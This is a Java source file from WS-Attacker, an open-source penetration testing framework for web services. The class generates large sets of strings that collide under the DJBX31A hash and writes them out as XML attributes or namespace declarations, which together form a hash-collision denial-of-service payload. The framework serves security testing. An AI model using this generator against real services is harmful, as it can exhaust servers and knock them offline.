/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos.dosExtension.attackClasses.hashDos;

import java.util.logging.Level;
import java.util.logging.Logger;

public class CollisionDJBX31A
    implements CollisionInterface
{

    private final Logger logger = Logger.getLogger( CollisionDJBX31A.class.getName() );

    /**
     * Get Hash Value for String using DJBX31A Algorithm
     * 
     * @param s
     * @return
     */
    @Override
    public int getHash( String s )
    {
        byte[] byteArray = s.getBytes();
        int n = byteArray.length;
        int hash = 0;
        for ( int i = 0; i < n; i++ )
        {
            // System.out.println(i
            // +" out of "+n+" mit Byte: "+(int)byteArray[i]+" und Hash preCalc: "+
            // ((hash<<5)-hash));
            hash = ( ( hash << 5 ) - hash ) + byteArray[i];
        }
        // System.out.println(hash);
        return hash;
    }

    /**
     * generates n Collisions for DJBX31A and writes result to sb All collisions are written in XML-Attribute Style
     * 
     * @param numberAttributes number of attributes to generate
     * @param sb Stringbuilder that will hold the attributes
     * @param boolean useNamespace - create NameSpace or Attribute
     */
    @Override
    public void genNCollisions( int numberAttributes, StringBuilder sb, boolean useNamespace )
    {

        try
        {
            final long startTime = System.nanoTime();
            final long endTime;
            String prefix = "";

            // calculate Exponent so that we can generate numberAttributes
            // Elements
            int exponent = 1;
            while ( numberAttributes > (int) Math.pow( 3, exponent ) )
            {
                exponent++;
            }

            if ( useNamespace )
            {
                prefix = "xmlns:";
            }

            for ( int i = 0; i < numberAttributes; i++ )
            {
                // System.out.println("Sind bei Element "+i+" von "+numberElements);
                // StringArray[i] = getString(i ,n , numberElements);
                // System.out.println("att"+i+"=\""+StringArray[i]+"\" ");
                // getHash(StringArray[i]);
                sb.append( prefix + getCollisionString( i, exponent ) + "=\"" + i + "\" " );
            }

            // output timing
            endTime = System.nanoTime();
            final long duration = endTime - startTime;
            double d = duration / 1000000000.0;
            logger.log( Level.FINE, "Runtime using DJBX31A creating n=" + numberAttributes + " collisions: " + d
                + "seconds" );

        }
        catch ( Exception e )
        {// Catch exception if any
            System.err.println( "Error: " + e.getMessage() );
        }
    }

    /**
     * get i-th ternaryCollisionString out of 3^n possible ternaryCollisionStrings since 3^n Elemnts can be generated
     * result string will have a length of 2*n chars 2*n since each Element is represented by 2 char string! How does it
     * work for n = 2 -> 3^2 = 9 possible strings? Algorithm generates 2*9 Matrix and replaces numbers with collision
     * strings aka table with ternary-Numbers row0: 00 row1: 01 row2: 02 row3: 10 row4: 11 row5: 12 row6: 20 row7: 21
     * row8: 22 for i = 4 -> 4th row is picked and created!
     * 
     * @param i i-th row out of 3^n rows
     * @param n exponent
     * @return String
     */
    @Override
    public String getCollisionString( int i, int n )
    {
        // init Bytes with collision Strings
        byte[] StringCollision0 = { 't', 't' };
        byte[] StringCollision1 = { 'u', 'U' };
        byte[] StringCollision2 = { 'v', '6' };

        // init empty ByteArray of correct Size for holding result!
        int numberElements = 2 * n;
        byte[] output = new byte[numberElements];
        for ( int j = 0; j < numberElements; j = j + 2 )
        {
            output[j] = 't';
            output[j + 1] = 't';
        }

        // get i-th row out of 3^n rows
        // aka convert i to ternary represantion!
        int divisor = i;
        int rest = 0;
        int count = 2 * n - 1;
        while ( divisor != 0 )
        {
            rest = divisor % 3;
            divisor = divisor / 3;
            // System.out.println("-- in loop - rest:"+rest+" divisor-"+divisor);
            switch ( rest )
            {
                case 0:
                    output[count] = StringCollision0[1];
                    output[count - 1] = StringCollision0[0];
                    break;
                case 1:
                    output[count] = StringCollision1[1];
                    output[count - 1] = StringCollision1[0];
                    break;
                case 2:
                    output[count] = StringCollision2[1];
                    output[count - 1] = StringCollision2[0];
                    break;
            }
            count -= 2;
            // System.out.println("--StringNew: "+new String(output));
        }
        // System.out.println("--StringNew: "+new String(output));
        return new String( output );
    }
}
